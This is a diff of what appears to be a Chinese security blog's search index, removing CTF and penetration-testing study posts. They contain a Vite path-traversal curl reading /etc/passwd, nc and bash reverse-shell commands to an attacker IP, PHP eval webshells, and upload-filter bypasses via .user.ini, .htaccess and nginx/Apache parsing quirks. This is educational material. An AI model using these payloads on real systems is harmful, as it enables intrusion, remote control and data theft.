-<pre><code class="highlight plaintext">curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173</code></pre>
-
-<p><a href="https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4">原链</a></p>
-<p><a href="https://xz.aliyun.com/news/17745">Vite任意文件读取bypass调试分析（CVE-2025-32395）-先知社区</a></p>
-]]></content>
-      <tags>
-        <tag>-CVE -Web</tag>
+        <tag>-web -渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -5020,101 +5048,6 @@ setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>
 ]]></content>
       <tags>
         <tag>-Web -CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一个飞舞的渗透学习实录</title>
-    <url>/2025/05/08/%E4%B8%80%E4%B8%AA%E9%A3%9E%E8%88%9E%E7%9A%84%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/</url>
-    <content><![CDATA[<p>—–不知道怎么形容，就叫做一个飞舞的渗透实录吧，飞舞挺飞舞的，学也真在学，唉唉，很难不着急(又幻想了，幻想不被后面来的web手打飞)，道心或许多多少少有点乱了，传统web基础有点学不进去了，搞点渗透调整一下状态吧，也刚好之后有个AWD可以练一下(我绝对不会说是为了AWD才提前开始学的。。)</p>
-<p>大概会持续更新吧嗯嗯，毕竟一朝一夕也学不完的</p>
-<h1 id="一个飞舞的渗透学习实录"><a href="#一个飞舞的渗透学习实录" class="headerlink" title="一个飞舞的渗透学习实录"></a>一个飞舞的渗透学习实录</h1><p>首先必须了解的就是一个完整的渗透测试的基本流程啦。。</p>
-<p>根据网上可考资料，渗透大概分成这样几个流程</p>
-<pre><code class="highlight plaintext">信息收集/外网打点
-内网渗透
-权限维持
-横向移动</code></pre>
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集能力，唉唉，你做web哪个不要信息收集，这东西确实需要好好训练一下</p>
-<h3 id="正面信息收集"><a href="#正面信息收集" class="headerlink" title="正面信息收集"></a>正面信息收集</h3><h4 id="网页信息"><a href="#网页信息" class="headerlink" title="网页信息"></a>网页信息</h4><p>在浏览网页的时候，有时可以拿到一些有用的信息的</p>
-<ul>
-<li>网页的URL:可能会暴露使用的脚本语言，再向下观察网站是否有在线客服窗口，网站底部你可能在网站页面观察到的信息有：URL信息（1.例如使用的OA.xxxcom2.使用的脚本语言）、在线客服、技术支持、关于公司的联系方式（邮箱、电话号码、工作地点等）、备案号、营业执照、后台登录接口、友情链接、某些二维码等。而且你抓包基本上也能抓到底层脚本语言的&#x2F;搂出底层框架的</li>
-</ul>
-<h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>可以先根据域名摸出来对应的IP(工具：<code>nslookup、ip138</code>)</p>
-<p>或者ping一下也能摸到ip，但是只能摸到一个IP(<strong>CDN</strong>的，但是我们要找的是真实的IP)</p>
-<p>所以要用超级PING(<code>itdog.com</code>)</p>
-<p>而要绕过IDN，需要ping一个不存在的二级域名，用邮箱(有自动回复就直接打掉了)或者用海外PING</p>
-<pre><code class="highlight plaintext">不太文明的方法。。用DdOS直接把CDN打掉</code></pre>
-
-<p><strong>端口</strong></p>
-<p>​	一个网站会开放多个端口，而我们可以通过同一网站的不同端口进行测试，扫描开放端口的方法有很多，方便的话是利用工具扫描端口，其次是用在线的端口扫描网站。端口扫描工具推荐有<code>nmap,goby</code>等</p>
-<p><strong>子域名</strong>&#x2F;<strong>资产测绘</strong></p>
-<p>​	收集子域名可以扩大测试的范围，统一域名下的二级域名都属于目标范围</p>
-<p>介绍一下子域名的相关概念</p>
-<pre><code class="highlight plaintext">顶级域名(一级域名/父域名)是类似于.com .net .org .cn之类
-其次的就要从右向左把优先度下降
-例如下面这两个域名:mail.example.com  calendar.example.com
-他们是example.com的两个子域，而example.com则是顶级域.com的子域</code></pre>
-
-<p>常见的子域名爆破工具：<code>oneforall、layer子域名挖掘机、SubDomainsBrute</code></p>
-<p>用<strong>fofa,hunter</strong></p>
-<p><strong>C段旁注</strong></p>
-<blockquote>
-<p>那我问你，C段是什么</p>
-</blockquote>
-<p>一个IP地址可以这样分解:</p>
-<pre><code class="highlight plaintext">192.168.0.1
-A  | B |C|D</code></pre>
-
-<p>一般C段指的是同一内网段下的其他服务器，也就是说是D段1-255中的一台服务器，C段入侵其实就是从其他服务器出发进行测试</p>
-<pre><code class="highlight plaintext">测试工具:Nmap</code></pre>
-
-<hr>
-<p>旁站就是要从同一服务器下的不同网站进行提权拿下服务器从而达到拿下所有网站的目的</p>
-<p>也可以用扫描器</p>
-<pre><code class="highlight plaintext">fscan,dddd,ez,fscanx,milkyway,xway,灯塔//fscan和nmap有些臭名昭著了，别用少用</code></pre>
-
-<p><strong>用户</strong></p>
-<p>收集用户的信息</p>
-<h4 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询"></a>资产查询</h4><p>公司名-&gt;ICP备案-&gt;子域名-&gt;IP</p>
-<p>看招标文件找供应商-&gt;打进政府云</p>
-<h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>这个很经典了，平常刷刷题目都会碰到的程度</p>
-<p><code>dirsearch</code>一般来说够用，不多赘述</p>
-<p>关注一下这些能进去的目录&#x2F;可以传参的一些带有特殊功能的页面</p>
-<pre><code class="highlight plaintext">任意文件下载
-后台
-未授权访问
-敏感信息泄露
-SQL注入</code></pre>
-
-<h4 id="web组件"><a href="#web组件" class="headerlink" title="web组件"></a>web组件</h4><p>​        各种web组件组合构成网站。</p>
-<p>操作系统<br>        网站服务器有不同的操作系统：<code>windows、Linux、mac os</code>这里需要知道的是windows对大小写不敏感，其他两个对大小写敏感就行了。</p>
-<p>（2）数据库<br>        目前比较常用的数据库有<code>:MySQL、SQL server、Oracle</code>等。SQL server开放的默认端口：1433，MySQL开放的默认端口：3306、Oracle开放的默认端口：1521。</p>
-<p>（3）容器<br>        目前比较常见的web中间件有：<code>IIS(iis解析漏洞)，apache，tcmact，nginx，jboss</code>等。</p>
-<p>（4）CMS<br>        <code>cms</code>有很多，这里就列举一部分例子：<code>dedeCMS</code>、 帝国CMS等。</p>
-<p>（5）web框架<br>        web框架有<code>struts1</code>、<code>Struts2</code>、<code>Spring MVC</code>等（框架漏洞）</p>
-<p>（6）web组件识别<br>        web组件识别（web指纹识别）一般可以识别出以上的网站基础信息。web指纹识别我分为在线扫描与工具识别。在线扫描的网站有：潮汐指纹识别<code>TideFinger</code> 潮汐指纹、云悉指纹yunsee.cn-2.0、强大的网站信息扫描网网站基础信息获取 - <code>ThreatScan</code> - 免费的网站在线安全检测平台-<code>TScan</code>；</p>
-<p>web指纹识别工具：御剑、北极熊扫描器等；指纹识别插件有<code>wappalyzer</code>。</p>
-<h3 id="侧面信息收集"><a href="#侧面信息收集" class="headerlink" title="侧面信息收集"></a>侧面信息收集</h3><h4 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h4><p>​     得到目标URL之后，我们可以通过站长之家来进行whios查询这家公司的信息。例如：公司名称，注册人或者机构、联系方式：邮箱，手机号码，备案号，ip，域名，DNS，少量子域名等。</p>
-<h4 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h4><p>​    常用的空间搜索引擎一般有：FOFA、shodan、zoomeye。其中FOFA一般搜索到的是一些网站的信息，收集到的偏软件类信息比较多；而shodan和zoomeye则是搜索网络在线设备信息，偏向于收集硬件的信息。具体使用规则需要自己去摸索。</p>
-<h4 id="Google搜索"><a href="#Google搜索" class="headerlink" title="Google搜索"></a>Google搜索</h4><p>​        Google语法是最强大的搜索手段之一，你可以收集到一些敏感页面、敏感目录、网站内可下载的文件、可能出现的sql注入点和文件上传点、未授权访问页面等。</p>
-<h4 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h4><p>​        通过识别网站是否存在WAF以及网站存在什么样的WAF，根据自己的水平（能否绕过此类WAF）来决定还应不应该花时间耗在绕WAF上（不仅限于参加比赛）。</p>
-<h4 id="一些不经常用的技巧"><a href="#一些不经常用的技巧" class="headerlink" title="一些不经常用的技巧"></a>一些不经常用的技巧</h4><pre><code class="highlight plaintext">查看github平台上有无类似本网站的源码，敏感信息，登陆的账号密码等
-社工
-钓鱼
-SSL证书查询</code></pre>
-
-<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>首先你要学会弹shell</p>
-<pre><code class="highlight plaintext">nc:
-攻击机:nc -lvvp [端口]
-目标机nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash
-
-bash:
-攻击机:nc -lvvp [端口]
-目标机:bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></pre>
-
-<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h2 id="清除痕迹擦屁股"><a href="#清除痕迹擦屁股" class="headerlink" title="清除痕迹擦屁股"></a>清除痕迹<del>擦屁股</del></h2>]]></content>
-      <tags>
-        <tag>-web -渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -6732,239 +6665,6 @@ usleep函数：延迟执行当前脚本数微秒，即条件竞争</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>文件上传漏洞</title>
-    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>大部分是需要回显储存路径才能打后续操作的，如果没有回显路径要不再想想。？(雾)</p>
-<h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h2><p>前端检测上传文件的后缀，js检测直接禁用js</p>
-<h2 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h2><h3 id="检测content-type"><a href="#检测content-type" class="headerlink" title="检测content-type"></a>检测content-type</h3><p>检测你发包的Content-Type参数来判断文件上传类型</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416151018927.png" alt="image-20250416151018927"></p>
-<p>一般你改一下content-type就可以绕过了</p>
-<h3 id="检测文件头判断文件类型"><a href="#检测文件头判断文件类型" class="headerlink" title="检测文件头判断文件类型"></a>检测文件头判断文件类型</h3><p>字义，使用getimagesize()函数来获取文件的MIME类型，此时检测的不是数据包中的content-type，而是文件头</p>
-<p>这种时候伪造一下就可以</p>
-<pre><code class="highlight scss"><span class="built_in">gif</span>(GIF89a) : <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> 
-jpg、jpeg : FF D8 FF 
-png : <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A</code></pre>
-
-<p>用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测，或者你直接在包的头写个GIF89a也是可以过的</p>
-<h3 id="后端检测文件拓展名"><a href="#后端检测文件拓展名" class="headerlink" title="后端检测文件拓展名"></a>后端检测文件拓展名</h3><p>用拓展名的黑名单来检测文件拓展名从而防止危险文件的上传</p>
-<p>绕过:</p>
-<p>1)使用一些特殊扩展名来绕过,<code>php</code>可以用php3、php4、php5代替</p>
-<p>2)大小写混淆绕过</p>
-<p>3)在文件名后加<code>.</code>(空格，点，空格)，利用windows特性绕过</p>
-<p>4)在文件名后加<code>::$data</code>绕过(<strong>NTFS流</strong>读入)</p>
-<p>5)有替换的话可以双写绕过</p>
-<hr>
-<p>当然也可以是白名单只让特定的文件上传</p>
-<p>绕过:</p>
-<p>存储路径可以使用%00在最后进行截断，（注意：GET型可以对%00自动解码，但POST型不能，需要在二进制中修改&#x2F;&#x2F;打开你的010喵，用空格占个位来输00）</p>
-<h3 id="后端检测文件内容"><a href="#后端检测文件内容" class="headerlink" title="后端检测文件内容"></a>后端检测文件内容</h3><h4 id="文件内容替换"><a href="#文件内容替换" class="headerlink" title="文件内容替换"></a>文件内容替换</h4><p>检测原理：</p>
-<p>在后端处理上传的文件时，会将将文件中的敏感字符替换掉。<br>参考代码</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-<span class="variable">$path</span> = <span class="string">&quot;./uploads&quot;</span>;
-<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);
-<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="variable">$content</span>);
-<span class="variable">$file</span> = <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];
-
-<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$file</span>)) &#123;
-        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);
-        <span class="keyword">echo</span> <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;
-&#125; <span class="keyword">else</span> &#123;
-        <span class="keyword">echo</span> <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;
-&#125;
-<span class="meta">?&gt;</span></code></pre>
-
-<p>绕过方法：<br>根据实际过滤的字符来判断，（一般不会限制所有敏感字符，因为还要兼顾图片上传）</p>
-<h4 id="图片二次渲染"><a href="#图片二次渲染" class="headerlink" title="图片二次渲染"></a>图片二次渲染</h4><p>检测原理：<br>后端调用了<code>php</code>的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</p>
-<p>绕过方法：<br>比较过滤前后文件内容，一般不会全部过滤。<br>比较使用<code>php-gd</code>转换之前和之后的gif图像，并搜索它们之间的任何相似性，因此，如果我在原始文件中找到相似的部分，则在使用<code>php-gd</code>转换后也保留了该部分然后我可以在那部分注入我的PHP代码并获得RCE</p>
-<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>该漏洞形成逻辑：<br>网站允许上传文件，然后检查上传文件是否包含<code>webshell</code>、是否是指定的文件类型。如果不是，那么删除该文件。在删除之前访问上传的<code>php</code>文件，从而执行上传文件中的<code>php</code>代码。</p>
-<p>绕过方法：<br>先进行文件上传，后进行判断与删除。利用时间差进行<code>webshell</code>上传。<br>竞争条件代码举例：</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span>
-	<span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($\_POST\[&quot;cmd&quot;\])?&gt;&#x27;</span>);
-<span class="meta">?&gt;</span></code></pre>
-
-<p>判断是否删除</p>
-<pre><code class="highlight python"><span class="keyword">import</span> requests  
-<span class="keyword">while</span> true:  
-	requests.get(”路径“)</code></pre>
-
-<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>当文件完全被ban，只用以图片类型上传的时候，我们该怎么办呢</p>
-<h3 id="上传-htaccess文件绕过"><a href="#上传-htaccess文件绕过" class="headerlink" title="上传.htaccess文件绕过"></a>上传.htaccess文件绕过</h3><p><code>.htaccess</code>文件是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>
-<p><code>.htaccess</code>主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p>
-<p><code>.htaccess</code>的用途范围主要针对当前目录</p>
-<p>类似内容</p>
-<pre><code class="highlight plaintext">ForceType application/x-httpd-php
-SetHandler application/x-httpd-php
-这些都会把上传的文件强制解析为php</code></pre>
-
-<h3 id="上传-user-ini文件绕过"><a href="#上传-user-ini文件绕过" class="headerlink" title="上传.user.ini文件绕过"></a>上传.user.ini文件绕过</h3><p><code>.user.ini</code>。它比<code>.htaccess</code>用的更广，不管是<code>nginx/apache/IIS</code>，只要是以<strong>fastcgi</strong>运行的<code>php</code>都可以用这个方法。</p>
-<p>那么什么是<code>.user.ini</code>？这得从<code>php.ini</code>说起了。<code>php.ini</code>是<code>php</code>默认的配置文件，其中包括了很多<code>php</code>的配置，这些配置中，又分为几种：<em>PHP_INI_SYSTEM</em>、<em>PHP_INI_PERDIR</em>、<em>PHP_INI_ALL</em>、<em>PHP_INI_USER</em>。在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p>
-<p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8d6872811ad6ca771a0debab4f7a50ce.png" alt="img"></p>
-<p>除了主 <code>php.ini </code>之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
-<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。</p>
-<p>所以除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。我们可以很容易地借助<code>.user.ini</code>文件，更改<code>auto_prepend_file</code>配置项，来构造一个“后门”。</p>
-<p>比如，某网站限制不允许上传<code>.php</code>文件，你便可以上传一个<code>.user.ini</code>，再上传一个图片马，包含起来进行<code>getshell</code>。不过前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件，否则也不能包含了。再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
-<p>实例([SUCTF 2019]CheckIn1):</p>
-<pre><code class="highlight javascript">$userdir = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_">md5</span>($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);
-<span class="keyword">if</span> (!<span class="title function_">file_exists</span>($userdir)) &#123;
-    <span class="title function_">mkdir</span>($userdir, <span class="number">0777</span>, <span class="literal">true</span>);
-&#125;
-<span class="title function_">file_put_contents</span>($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);
-<span class="keyword">if</span> (<span class="title function_">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;
-    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];
-    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];
-    <span class="keyword">if</span> (!$tmp_name) &#123;
-        <span class="title function_">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);
-    &#125;
-    <span class="keyword">if</span> (!$name) &#123;
-        <span class="title function_">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);
-    &#125;
-    $extension = <span class="title function_">substr</span>($name, <span class="title function_">strrpos</span>($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);
-    <span class="keyword">if</span> (<span class="title function_">preg_match</span>(<span class="string">&quot;/ph|htaccess/i&quot;</span>, $extension)) &#123;
-        <span class="title function_">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);
-    &#125;
-    <span class="keyword">if</span> (<span class="title function_">mb_strpos</span>(<span class="title function_">file_get_contents</span>($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="variable constant_">FALSE</span>) &#123;
-        <span class="title function_">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);
-    &#125;
-    $image_type = <span class="title function_">exif_imagetype</span>($tmp_name);
-    <span class="keyword">if</span> (!$image_type) &#123;
-        <span class="title function_">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);
-    &#125;
-    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;
-    <span class="title function_">move_uploaded_file</span>($tmp_name, $upload_file_path);
-    echo <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;
-    echo <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;
-    <span class="title function_">var_dump</span>(<span class="title function_">scandir</span>($userdir));
-&#125;</code></pre>
-
-<p><strong>绕过技巧</strong>：</p>
-<p>1.针对过滤包含<code>ph</code>与<code>htaccess</code>扩展名的文件：上传<code>.user.ini</code>与图片马，利用<code>.user.ini</code>进行文件包含2.针对过滤文件内容包含<code>&lt;?</code>的文件：使用<code>php</code>的脚本标记风格<code>&lt;script language=&#39;php&#39;&gt;</code>3.针对使用<code>exif_imagetype</code>规定了必须为图片类型的文件：添加文件头内容或合成图片马（稍后会讲）</p>
-<p>首先上传<code>.user.ini</code>文件，文件内容为：</p>
-<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
-auto_prepend_file=shell.<span class="property">png</span></code></pre>
-
-<p>然后构造一个<code>shell.png</code>，内容如下：</p>
-<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
-&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); &lt;/script&gt;</code></pre>
-
-<p>然后将两个文件分别上传到服务器上，拿到回显</p>
-<h3 id="奇奇怪怪的绕过"><a href="#奇奇怪怪的绕过" class="headerlink" title="奇奇怪怪的绕过"></a>奇奇怪怪的绕过</h3><p>利用一下文件包含上传一个压缩包来getshell</p>
-<p>这里不细讲</p>
-<h2 id="Ngnix解析漏洞"><a href="#Ngnix解析漏洞" class="headerlink" title="Ngnix解析漏洞"></a>Ngnix解析漏洞</h2><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p>对于任意文件名，在后面添加<code>/abc.php</code>(abc为任意字符)后，即可将文件作为php解析</p>
-<p><strong>漏洞机理</strong></p>
-<p>Nginx配置导致，而非nginx版本问题，而取决于php的配置文件 php.ini 文件中是否开启了<code> cgi.fix_pathinfo</code></p>
-<p>当访问<code>xxx.jpg/abc.php</code>时，nginx查看URL后发现以php结尾，并将路径传递给<code>phpfastcgi</code>处理程序，php看到<code>xxx.jpg/abc.php</code>不存在，便删除去最后的<code>/abc.php</code>，看到<code>xxx.jpg</code>存在，而后以<code>php</code>的形式执行<code>xxx.jpg</code>的内容</p>
-<p>大概的来说，就是<code>cgi.fix_pathinfo</code>会对形如<code>/1.aaa/2.bbb/3.cccc</code>的文件路径进行处理，若该路径不存在，则会去掉最后的子路径再次判断直到找到一个存在的路径。</p>
-<p>若关闭该选项，访问<code>/xxx.jpg/abc.php</code>会返回找不到文件，但关闭该选项可能会导致一些其他错误，所以默认开启。</p>
-<p>在高版本中，引入了<code>security.limit_extensions</code>来纠正这个错误，限制了可执行文件的后缀，默认只允许执行<code>.php</code>文件。防止这一问题(回显Access denied)</p>
-<h3 id="空字节RCE"><a href="#空字节RCE" class="headerlink" title="空字节RCE"></a>空字节RCE</h3><p>Nginx在遇到%00空字节时与后段<code>FastCGI</code>处理不一致，导致可以在图中嵌入PHP代码然后通过访问<code>1.jpg%00.php</code>来执行其中的代码。</p>
-<p><strong>影响版本</strong></p>
-<pre><code class="highlight plaintext">nginx 0.5.*
-nginx 0.6.*
-nginx 0.7 &lt;= 0.7.65
-nginx 0.8 &lt;= 0.8.37</code></pre>
-
-<p>该漏洞不受cgi.fix_pathinfo影响，当为0时，依旧可以解析</p>
-<h3 id="CVE-2013-4547-20-00"><a href="#CVE-2013-4547-20-00" class="headerlink" title="CVE-2013-4547(%20%00)"></a>CVE-2013-4547(%20%00)</h3><p><strong>影响版本</strong></p>
-<pre><code class="highlight plaintext">nginx 0.8.41 ~ 1.5.6</code></pre>
-
-<p>原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。是什么意思呢？举个例子，假设服务器上存在文件：“file.jpg ”，注意文件名的最后一个字符是空格。则可以通过访问：<code>http://127.0.0.1/file.jpg \0.php</code> </p>
-<p>让Nginx认为文件“file.jpg ”的后缀为<code>.php</code></p>
-<p>来测试下，这次测试在Nginx&#x2F;1.0.15中进行。首先准备一张图片，命名为“test.html ”，注意，文件名含有空格。然后在浏览器中访问该文件，会得到一个404，因为浏览器自动将空格编码为%20，服务器中不存在文件“test.html%20”。</p>
-<p>测试目标是要让Nginx认为该文件是图片文件并正确地在浏览器中显示出来。我们想要的是未经编码的空格和截止符（\0），怎么办呢？使用Burp Suite抓取浏览器发出的请求包，修改为我们想要的样子，原本的URL是：<code>http://192.168.56.101/test.htmlAAAjpg </code>,将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码），如图<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194656774-1403436835.png" alt="1964477-20200308194656774-1403436835"></p>
-<p>修改完毕后Forward该请求，在浏览器中看到：</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194716298-1059932045.png" alt="1964477-20200308194716298-1059932045"></p>
-<p>我们已经成功地利用了漏洞！但这有什么用呢？我们想要的是代码被执行。</p>
-<p>继续测试，准备文件“test.jpg ”，注意文件名的最后一个字符是空格，上传到服务器。文件内容为：</p>
-<pre><code class="highlight php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>
-
-<p>用Burp Suite抓包并修改，原本的URL是：<code>http://192.168.56.101/test.jpg…php</code> ,将jpg后的第一个“.”改为20，第二个“.”改为00，如下图所示</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194746793-602361880.png" alt="1964477-20200308194746793-602361880"></p>
-<p>修改完毕后 Forword 该请求，在浏览器中看到：Access denied ，好吧，又是这个。</p>
-<p>这说明Nginx在接收到这一请求后，确实把文件“test.jpg ”当做php文件交给php去执行了，只是php看到该文件后缀为“.jpg ”而拒绝执行。这样，便验证了Nginx确实存在该漏洞。但是由于<code>security.limit_extensions</code>的存在，导致我们并不能利用此漏洞</p>
-<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p><code>Apache</code>从右向左判断解析文件,若无法解析再继续向左判断,如<code>1.php.owf.rar</code>这个文件名，<code>Apache</code>无法解析<code>.owf</code>和<code>.rar</code>两个后缀，于是继续向前解析将其解析为1.php</p>
-<p>实际上许多后缀都可以被解析为php文件进行处理，这里贴一下其他师傅的文章</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250417211410728.png" alt="image-20250417211410728"></p>
-<pre><code class="highlight plaintext">原链接:https://www.cnblogs.com/yokan/p/12444476.html
-可以用shell.php/x.php/..绕</code></pre>
-
-<h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><p>是Apache下的一个配置文件，负责相关目录下的网页配置。通过<code> .htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 <code>httpd.conf</code> 文件中配置。</p>
-<pre><code class="highlight plaintext">生效前提:
-AllowOverride被启用/AllowOverride Options FileInfo
-mod_rewrite 模块开启
-cgi_module被加载。即apache配置文件中有LoadModule cgi_module modules/mod_cgi.so这么一句且没有被注释</code></pre>
-
-<p>这里放几个常用的配置</p>
-<h4 id><a href="#" class="headerlink" title></a></h4><pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
-
-<p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析</p>
-<h4 id="CGI启动方式利用"><a href="#CGI启动方式利用" class="headerlink" title="CGI启动方式利用"></a>CGI启动方式利用</h4><pre><code class="highlight plaintext">Options ExecCGI (表示允许CGI执行，若AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了。)
-AddHandler cgi-script .xx(将.xx后缀的文件当成CGI程序解析)
-#AddHandler application/x-httpd-php .php (给php后缀增加了处理器，这样即使有多个后缀，只要含有php后缀就会被识别为php文件)</code></pre>
-
-<p>下面是网上一个师傅的利用</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083343333.png" alt="image-20250418083343333"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083404184.png" alt="image-20250418083404184"></p>
